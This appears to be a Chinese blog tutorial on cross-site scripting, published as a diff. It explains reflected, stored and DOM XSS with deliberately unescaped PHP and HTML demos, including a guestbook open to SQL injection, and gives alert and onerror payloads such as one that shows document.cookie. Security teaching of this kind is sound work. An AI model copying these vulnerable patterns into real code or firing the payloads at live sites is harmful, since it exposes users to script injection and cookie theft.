@@ -1,0 +1,1760 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+<meta name="google-site-verification" content="QrYuOcgHntsSXYVGvWVZS98NACE7wP7Rx3KVbK2_F1s">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-128x128-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="离沫凌天๓" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="XSS跨站脚本攻击XSS简介XSS攻击指黑客通过特殊的手段往网页中插入了恶意的JavaScript脚本，从而在用户浏览网页时，对用户浏览器发起Cookie资料窃取、会话劫持、钓鱼欺骗等各攻击。 XSS跨站脚本攻击本身对Web服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web浏览器中打开该UR">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS跨站脚本攻击">
+<meta property="og:url" content="https://winthorlimo.github.io/note/2020/undefined06/db4b83e4.html">
+<meta property="og:site_name" content="离沫凌天๓">
+<meta property="og:description" content="XSS跨站脚本攻击XSS简介XSS攻击指黑客通过特殊的手段往网页中插入了恶意的JavaScript脚本，从而在用户浏览网页时，对用户浏览器发起Cookie资料窃取、会话劫持、钓鱼欺骗等各攻击。 XSS跨站脚本攻击本身对Web服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web浏览器中打开该UR">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/1555333317665.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/1578577230860.jpg">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/1578577808625.jpg">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/1555378624885.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200809130101.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200809130716.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200804104046.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200804103859.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200804113440.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/1555576102908.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/1555575984473.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/1555499820467.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/1555500203323.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/1555500926177.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/1555507993008.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/image-20200803134636686.png">
+<meta property="og:updated_time" content="2020-08-20T09:26:18.232Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS跨站脚本攻击">
+<meta name="twitter:description" content="XSS跨站脚本攻击XSS简介XSS攻击指黑客通过特殊的手段往网页中插入了恶意的JavaScript脚本，从而在用户浏览网页时，对用户浏览器发起Cookie资料窃取、会话劫持、钓鱼欺骗等各攻击。 XSS跨站脚本攻击本身对Web服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web浏览器中打开该UR">
+<meta name="twitter:image" content="http://qiniuyun.lintstar.top/1555333317665.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://winthorlimo.github.io/note/2020/undefined06/db4b83e4.html">
+
+
+
+
+
+  <title>XSS跨站脚本攻击 | 离沫凌天๓</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">离沫凌天๓</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">花开花落 一路上起起跌跌</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://winthorlimo.github.io/note/2020/undefined06/db4b83e4.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="离沫凌天๓">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="离沫凌天๓">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">XSS跨站脚本攻击</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-06T22:00:00+08:00">
+                2020-08-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                  <span class="post-meta-divider">|</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  10.5k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  48
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h1><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><p>XSS攻击指黑客通过特殊的手段往网页中插入了恶意的JavaScript脚本，从而在用户浏览网页时，对用户浏览器发起Cookie资料窃取、会话劫持、钓鱼欺骗等各攻击。</p>
+<p>XSS跨站脚本攻击本身对Web服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web浏览器中打开该URL的时侯，恶意脚本会在受害者的计算机上悄悄执行。</p>
+<p>XSS跨站脚本攻击漏洞也是OWASP Top 10中经常出现的对象，造成XSS漏洞普遍流行的原因如下:</p>
+<ol>
+<li>Web浏览器本身的设计不安全，无法判断JS代码是否是恶意的</li>
+<li>输入与输出的Web应用程序基本交互防护不够</li>
+<li>程序员缺乏安全意识，缺少对XSS漏洞的认知</li>
+<li>XSS触发简单，完全防御起来相当困难</li>
+</ol>
+<h2 id="XSS跨站脚本实例"><a href="#XSS跨站脚本实例" class="headerlink" title="XSS跨站脚本实例"></a>XSS跨站脚本实例</h2><p>下面的HTML代码就演示了一个最基本的XSS弹窗：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert("XSS")</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>/</code> 正斜杠也可以弹窗</p>
+<p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>弹cooike</p>
+</blockquote>
+<p>该代码直接再HTML页面通过<code>&lt;script&gt;</code>标签来执行了javaScript内置的alert()函数，达到弹出消息框弹窗的效果：</p>
+<p><img src="http://qiniuyun.lintstar.top/1555333317665.png" alt="1555333317665"></p>
+<p>XSS攻击就是将非法的JavaScript代码注入到用户浏览的网页上执行，而Web浏览器本身的设计是不安全的，它只负责解释和执行JavaScript等脚本语言，而不会判断代码本身是否对用户有害。</p>
+<h2 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h2><p>诚然，XSS可能不如SQL注射、文件上传等能够直接得到较高操作权限的漏洞，但是它的运用十分灵活（这使它成为最深受黑客喜爱的攻击技术之一），只要开拓思维，适当结合其他技术一起运用，XSS的威力还是很大的。可能会给网站和用户带来的危害简单概括如下：</p>
+<ol>
+<li>网络钓鱼</li>
+<li>盗取用户cookies信息</li>
+<li>劫持用户浏览器</li>
+<li>强制弹出广告页面、刷流量</li>
+<li>网页挂马</li>
+<li>进行恶意操作，例如任意篡改页面信息</li>
+<li>获取客户端隐私信息</li>
+<li>控制受害者机器向其他网站发起攻击</li>
+<li>结合其他漏洞，如CSRF漏洞，实施进一步作恶</li>
+<li>提升用户权限，包括进一步渗透网站</li>
+<li>传播跨站脚本蠕虫等</li>
+</ol>
+<h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="反射型XSS（非持久型）"><a href="#反射型XSS（非持久型）" class="headerlink" title="反射型XSS（非持久型）"></a>反射型XSS（非持久型）</h2><p>反射型跨站脚本（Reflected Cross-site Scripting）也称作非持久型、参数型跨站脚本。反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。</p>
+<p>假设一个页面把用户输入的参数直接输出到页面上：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$input = $_GET[<span class="string">'param'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$input.<span class="string">"&lt;/h1&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>用户向<code>param</code>提交的数据会展示到<code>&lt;h1&gt;</code>的标签中展示出来，比如提交:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?param=Hello XSS</span><br></pre></td></tr></table></figure>
+<p>会得到如下结果:</p>
+<p><img src="http://qiniuyun.lintstar.top/1578577230860.jpg" alt="1578577230860"></p>
+<p>此时查看页面源代码，可以看到：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello XSS<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此时如果提交一个JavaScript代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?param=&lt;script&gt;alert(233)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>会发现，<code>alert(233)</code>在当前页面执行了：</p>
+<p><img src="http://qiniuyun.lintstar.top/1578577808625.jpg" alt="1578577808625"></p>
+<p>再查看源代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(233)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>用户输入的Script脚本，已经被写入页面中，这个就是一个最经典的反射型XSS，它的特点是只在用户浏览时触发，而且只执行一次，非持久化，所以称为反射型XSS。反射型XSS的危害往往不如持久型XSS，因为恶意代码暴露在URL参数中，并且时刻要求目标用户浏览方可触发，稍微有点安全意识的用户可以轻易看穿该链接是不可信任的。如此一来，反射型XSS的攻击成本要比持久型XSS高得多，不过随着技术的发展，我们可以将包含漏洞的链接通过<strong>短网址缩短</strong>或者<strong>转换为二维码</strong>等形式灵活运用。</p>
+<h2 id="存储XSS（持久型）"><a href="#存储XSS（持久型）" class="headerlink" title="存储XSS（持久型）"></a>存储XSS（持久型）</h2><p>存储型XSS和反射型XSS的差别仅在于：提交的XSS代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子是留言板XSS。</p>
+<p>为了复现存储型XSS，这里我们得用到数据库，本地新建一个名字叫做<code>xss</code>的数据库，里面新建一个<code>message</code>表，用来存放用户的留言信息，字段名分别是<code>id</code>、<code>username</code>、<code>message</code></p>
+<p><img src="http://qiniuyun.lintstar.top/1555378624885.png" alt="1555378624885"></p>
+<p><code>id</code>设为主键，并勾选<strong>自动递增</strong> ，也可以参考下面的<code>sql</code>语句来设计表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SET NAMES utf8mb4;</span><br><span class="line">SET FOREIGN_KEY_CHECKS = 0</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `message`;</span><br><span class="line">CREATE TABLE `message`  (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,</span><br><span class="line">  `message` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = MyISAM AUTO_INCREMENT = 17 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">SET FOREIGN_KEY_CHECKS = 1;</span><br></pre></td></tr></table></figure>
+<p>目前数据库方面设计完了，开始着手写<code>PHP</code>后端页面，来复现一下存储型XSS漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">/*数据库信息配置*/</span><br><span class="line">$host = &quot;localhost&quot;; //数据库地址</span><br><span class="line">$port = &quot;3306&quot;; //数据库端口</span><br><span class="line">$user = &quot;root&quot;; //数据库用户名</span><br><span class="line">$pwd = &quot;root&quot;; //数据库密码</span><br><span class="line">$dbname = &quot;xss&quot;; //数据库名</span><br><span class="line">$conn = new mysqli($host,$user,$pwd,$dbname,$port);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 前端用户输入表单 --&gt;</span><br><span class="line">&lt;h1&gt;留言板的存储型XSS&lt;/h1&gt;</span><br><span class="line">&lt;form  method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;姓名&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;message&quot; placeholder=&quot;请输入您的留言&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    /*直接将留言插入到数据库中*/</span><br><span class="line">    $username=$_POST[&apos;username&apos;];</span><br><span class="line">    $message=$_POST[&apos;message&apos;];</span><br><span class="line">    if($username and $message)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql=&quot;INSERT INTO `message`(`username`, `message`) VALUES (&apos;&#123;$username&#125;&apos;,&apos;&#123;$message&#125;&apos;)&quot;;</span><br><span class="line">        if ($conn-&gt;query($sql) === TRUE) &#123;</span><br><span class="line">            echo &quot;留言成功&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;请填写完整信息&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*查询数据库中的留言信息*/</span><br><span class="line">    $sql = &quot;SELECT username, message FROM message&quot;;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">        while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">            echo &quot;用户名：&quot; . $row[&quot;username&quot;]. &quot;留言内容:&quot; . $row[&quot;message&quot;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;暂无留言&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>将以上代码保存为<code>php</code>文件，配置好数据库连接信息，通过http服务去访问，可以得到如下界面：</p>
+<p><img src="http://qiniuyun.lintstar.top/20200809130101.png" alt="20200809130101"></p>
+<p>可以从代码看出，逻辑很简单，用户前端留言，就可以看到自己的留言信息了，代码中没有任何过滤，直接将用户的输入的语句插入到了<code>html</code>网页中，这样就很容易导致存储型<code>XSS</code>漏洞的产生。</p>
+<p>当攻击者直接在留言板块插入<code>&lt;script&gt;alert(&#39;鸡你太美&#39;)&lt;/script&gt;</code>，会导致这条恶意的语句直接插入到了数据库中，然后通过网页解析，成功触发了JS语句，导致用户浏览这个网页就会一直弹窗，除非从数据库中删除这条语句：</p>
+<p><img src="http://qiniuyun.lintstar.top/20200809130716.png" alt="20200809130716"></p>
+<p>此时查看下网页源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">b</span>&gt;</span>蔡徐坤   <span class="tag">&lt;<span class="name">b</span>&gt;</span>留言内容:<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('鸡你太美')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>存储型XSS的攻击是最隐蔽的也是危害比较大的，普通用户所看的URL为<code>http://127.0.0.1/test.php</code>，从URL上看均是正常的，但是当目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有XSS代码，就当做正常的HTML与JS解析执行，于是就触发了XSS攻击。</p>
+<blockquote>
+<p>持久：只要不清除数据库数据，每次访问就会一直弹窗</p>
+</blockquote>
+<h2 id="DOM型-XSS"><a href="#DOM型-XSS" class="headerlink" title="DOM型 XSS"></a>DOM型 XSS</h2><p>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。它和反射型XSS、存储型XSS的差别在于，DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。</p>
+<p>下面编写一个简单的含有DOM XSS漏洞的HTML代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    function xss()&#123;</span></span><br><span class="line"><span class="undefined">        var str = document.getElementById("src").value;</span></span><br><span class="line"><span class="xml">        document.getElementById("demo").innerHTML = "<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'"+str+"'</span> /&gt;</span>";</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"src"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">placeholder</span>=<span class="string">"输入图片地址"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"插入"</span> <span class="attr">onclick</span>=<span class="string">"xss()"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"demo"</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>功能很简单，用户输入框插入图片地址后，页面会通过<code>&lt;img&gt;</code>标签将插入的图片显示在网页上：</p>
+<p><img src="http://qiniuyun.lintstar.top/20200804104046.png" alt="20200804104046"></p>
+<p>同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos; onerror=alert(233)//&apos;</span><br><span class="line"></span><br><span class="line">x&apos; onerror=alert(233) x=&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="http://qiniuyun.lintstar.top/20200804103859.png" alt="20200804103859"></p>
+<p>会直接在<code>&lt;img&gt;</code>标签中插入<code>onerror</code>事件，该语句表示当图片加载出错的时候，自动触发后面的alert()函数，来达到弹窗的效果，这就是一个最简单的DOM型XSS漏洞。</p>
+<h1 id="XSS靶场搭建"><a href="#XSS靶场搭建" class="headerlink" title="XSS靶场搭建"></a>XSS靶场搭建</h1><p>本节主要是搭建一些靶场，因为大家都是搞信息安全的，所以靶场搭建的话我这里就不重复造轮子，通过搜索引擎可以找到很多图文并茂的教程，所以本节里面只做概括的作用。</p>
+<h2 id="Web-For-Pentester"><a href="#Web-For-Pentester" class="headerlink" title="Web For Pentester"></a>Web For Pentester</h2><p><strong>官网</strong>：<a href="https://pentesterlab.com/" target="_blank" rel="noopener">https://pentesterlab.com/</a></p>
+<p><strong>下载地址</strong>：<a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso" target="_blank" rel="noopener">https://isos.pentesterlab.com/web_for_pentester_i386.iso</a></p>
